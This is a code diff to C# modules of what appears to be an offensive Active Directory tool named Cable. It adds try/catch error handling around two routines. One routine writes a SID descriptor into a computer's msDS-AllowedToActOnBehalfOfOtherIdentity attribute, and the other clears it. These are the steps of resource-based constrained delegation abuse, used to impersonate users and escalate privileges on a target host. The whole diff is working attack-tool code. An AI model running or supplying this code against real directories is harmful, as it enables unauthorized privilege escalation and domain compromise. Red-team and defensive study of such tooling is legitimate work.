@@ -77,20 +77,27 @@ namespace Cable.Modules
                 return;
             }
 
-            foreach (SearchResult sr in results)
+            try
             {
-                DirectoryEntry mde = sr.GetDirectoryEntry();
-                if (sr.Properties.Contains("msds-allowedtoactonbehalfofotheridentity"))
+                foreach (SearchResult sr in results)
                 {
-                    Console.WriteLine("[!] This host already has a msDS-AllowedToActOnBehalfOfOtherIdentity attribute set..");
-                    return;
+                    DirectoryEntry mde = sr.GetDirectoryEntry();
+                    if (sr.Properties.Contains("msds-allowedtoactonbehalfofotheridentity"))
+                    {
+                        Console.WriteLine("[!] This host already has a msDS-AllowedToActOnBehalfOfOtherIdentity attribute set..");
+                        return;
+                    }
+                    else
+                    {
+                        mde.Properties["msds-allowedtoactonbehalfofotheridentity"].Add(bDescriptor);
+                        mde.CommitChanges();
+                        Console.WriteLine("[+] SID added to msDS-AllowedToActOnBehalfOfOtherIdentity");
+                    }
                 }
-                else
-                {
-                    mde.Properties["msds-allowedtoactonbehalfofotheridentity"].Add(bDescriptor);
-                    mde.CommitChanges();
-                    Console.WriteLine("[+] SID added to msDS-AllowedToActOnBehalfOfOtherIdentity");
-                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] Adding SID failed: " + ex.Message);
             }
         }
 
@@ -111,20 +118,27 @@ namespace Cable.Modules
                 return;
             }
 
-            foreach (SearchResult sr in results)
+            try
             {
-                if (sr.Properties.Contains("msDs-AllowedToActOnBehalfOfOtherIdentity"))
+                foreach (SearchResult sr in results)
                 {
-                    DirectoryEntry mde = sr.GetDirectoryEntry();
-                    mde.Properties["msds-allowedtoactonbehalfofotheridentity"].Clear();
-                    mde.CommitChanges();
-                    Console.WriteLine("[+] SIDs cleared from msDs-AllowedToActOnBehalfOfOtherIdentity");
+                    if (sr.Properties.Contains("msDs-AllowedToActOnBehalfOfOtherIdentity"))
+                    {
+                        DirectoryEntry mde = sr.GetDirectoryEntry();
+                        mde.Properties["msds-allowedtoactonbehalfofotheridentity"].Clear();
+                        mde.CommitChanges();
+                        Console.WriteLine("[+] SIDs cleared from msDs-AllowedToActOnBehalfOfOtherIdentity");
+                    }
+                    else
+                    {
+                        Console.WriteLine("[!] Account does not have msDs-AllowedToActOnBehalfOfOtherIdentity set");
+                        return;
+                    }
                 }
-                else
-                {
-                    Console.WriteLine("[!] Account does not have msDs-AllowedToActOnBehalfOfOtherIdentity set");
-                    return;
-                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] Flushing SID failed: " + ex.Message);
             }
         }
 
